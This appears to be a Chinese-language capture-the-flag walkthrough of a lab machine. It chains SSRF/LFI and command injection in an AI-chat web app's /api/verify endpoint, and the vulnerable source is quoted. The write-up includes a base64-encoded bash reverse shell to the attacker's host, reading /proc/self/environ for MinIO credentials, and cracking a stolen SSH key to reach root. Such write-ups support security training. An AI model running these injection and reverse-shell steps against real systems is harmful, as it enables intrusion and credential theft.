# 信息收集

## 局域网发现与端口确认

```bash
sudo arp-scan -l
```

```text
192.168.205.134 08:00:27:ae:60:51       PCS Systemtechnik GmbH
```

我先用 `arp-scan` 把靶机找出来，目标是 `192.168.205.134`。

```bash
nmap -p 0-65535 192.168.205.134
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

全端口扫完就两个服务，重点自然放在 Web。

## 域名分流处理

```bash
curl 192.168.205.134
```

```html
<h1>请使用域名访问</h1>
<code>http://cu6l.dsz</code>
<code>http://www.cu6l.dsz</code>
```

IP 访问是提示页，要求走域名。

```bash
echo '192.168.205.134 cu6l.dsz www.cu6l.dsz' | sudo tee -a /etc/hosts
```

配完后我试了 `www.cu6l.dsz` 还是提示页，`cu6l.dsz` 才是实际业务页面（一个 AI 聊天窗口）。

# 从前端接口切进后端

## 锁定 `/api/verify`

前端 JS 里能看到验证 API 的请求逻辑：

```javascript
const response = await fetch(`${API_BASE}/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        base_url: baseUrl,
        api_key: apiKey,
        model,
        headers
    })
});
```

这里把用户输入的 `base_url` 直接送后端做“验证”，这个设计我当时就盯上了，优先测 SSRF/LFI。

```bash
python3 -m http.server 80
```

然后我让 `/api/verify` 指向我的 Kali：

```bash
curl -s -X POST http://cu6l.dsz/api/verify \
  -H "Content-Type: application/json" \
  -d '{"base_url":"http://192.168.205.128","api_key":"a","model":"a","headers":{}}' | python3 -m json.tool
```

```json
{
    "data": "<!DOCTYPE HTML>...Unsupported method ('POST')...",
    "stdout": "<!DOCTYPE HTML>...Unsupported method ('POST')...",
    "success": true
}
```

这一步证明后端确实会拿我的 `base_url` 去发请求，而且响应内容还会回显回来。

# LFI 拿配置与源码

## 读取 `/etc/passwd`

```bash
curl -s -X POST http://cu6l.dsz/api/verify \
  -H "Content-Type: application/json" \
  -d '{"base_url":"file:///etc/passwd","api_key":"a","model":"a","headers":{}}' | python3 -m json.tool
```

```text
...
yliken:x:1001:1001::/home/yliken:/bin/bash
```

`file://` 能读本地文件，LFI 成立。系统里有个 `yliken` 用户，后面会用到。

## 读取进程环境变量

```bash
curl -s -X POST http://cu6l.dsz/api/verify \
  -H "Content-Type: application/json" \
  -d '{"base_url":"file:///proc/self/environ","api_key":"a","model":"a","headers":{}}' | python3 -m json.tool
```

```text
USER=yliken
MINIO_ACCESS_KEY=dszminioadmin
MINIO_ENDPOINT=127.0.0.1:9000
MINIO_SECRET_KEY=dszminioadmin-01
PWD=/app/backend
```

这波直接爆了 MinIO 凭据和后端工作目录，信息价值很高。

## 读取后端源码确认利用点

```bash
curl -s -X POST http://cu6l.dsz/api/verify \
  -H "Content-Type: application/json" \
  -d '{"base_url":"file:///proc/self/cwd/app.py","api_key":"a","model":"a","headers":{}}' | python3 -m json.tool
```

源码里关键片段是这几行：

```python
curl_command = f"curl -X POST {base_url} -H 'Content-Type: application/json' -H 'Authorization: Bearer {api_key}'"

for key, value in headers.items():
    curl_command += f" -H '{key}: {value}'"

result = subprocess.run(
    curl_command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=30
)
```

这里就是标准命令拼接。到这一步基本已经是可控命令执行了，不只是 SSRF/LFI。

# 命令注入拿到 `yliken` shell

## 反弹监听与 payload 准备

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

```bash
echo 'bash -i >& /dev/tcp/192.168.205.128/4444 0>&1' | base64
```

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvNDQ0NCAwPiYxCg==
```

我这边用 base64 包了一层反弹命令，触发点就是 `/api/verify` 的命令注入位置。

## 收到 shell 并确认 user flag

```bash
nc -lvnp 4444
```

```text
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.134] 60398
bash: cannot set terminal process group (321): Inappropriate ioctl for device
bash: no job control in this shell
yliken@cu6l:/app/backend$ id
uid=1001(yliken) gid=1001(yliken) groups=1001(yliken)
yliken@cu6l:~$ ls -al
-rw-r--r-- 1 root   root     56 Feb  8 21:12 hint
-rw-r--r-- 1 root   root     44 Feb  6 05:07 user.txt
yliken@cu6l:~$ cat user.txt
flag{user-9ffbf43126e33be52cd2bf7e01d627f9}
yliken@cu6l:~$ cat hint
记性不好，密码老忘
找个地方存一下吧。
```

拿到 `yliken` 后，`hint` 这句基本就是在暗示“有凭据存储点”，正好前面已经拿到了 MinIO 配置。

# 利用 MinIO 凭据挖出 root 私钥

## 枚举 bucket 和对象

```python
from minio import Minio
client = Minio('127.0.0.1:9000', access_key='dszminioadmin', secret_key='dszminioadmin-01', secure=False)
for bucket in client.list_buckets():
    print(f'Bucket: {bucket.name}')
    for obj in client.list_objects(bucket.name, recursive=True):
        print(f'  {obj.object_name} ({obj.size} bytes)')
```

```text
Bucket: avatars
  session-1770371365222.jpg (67124 bytes)
  session-1770603327996.jpg (301619 bytes)
  session-1770603535956.jpg (301619 bytes)
Bucket: mysecret
  id_rsa (3414 bytes)
```

`mysecret/id_rsa` 这个名字已经非常直白了，直接取出来看。

## 下载 `id_rsa`

```python
from minio import Minio
client = Minio('127.0.0.1:9000', access_key='dszminioadmin', secret_key='dszminioadmin-01', secure=False)
data = client.get_object('mysecret', 'id_rsa')
print(data.read().decode())
data.close()
data.release_conn()
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

私钥有口令保护，直接 `ssh -i` 用不了，需要先跑解密口令。

## 爆破私钥口令并登录 root

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
superman         (id_rsa)
```

口令是 `superman`，然后直接用这把 key 登 root：

```bash
ssh root@192.168.205.134 -i /tmp/id_rsa
```

```text
Enter passphrase for key '/tmp/id_rsa':
root@cu6l:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cu6l:~# cat /root/root.txt
flag{root-009520053b00386d1173f3988c55d192}
```

到这里靶机权限和两个 flag 都完成验证。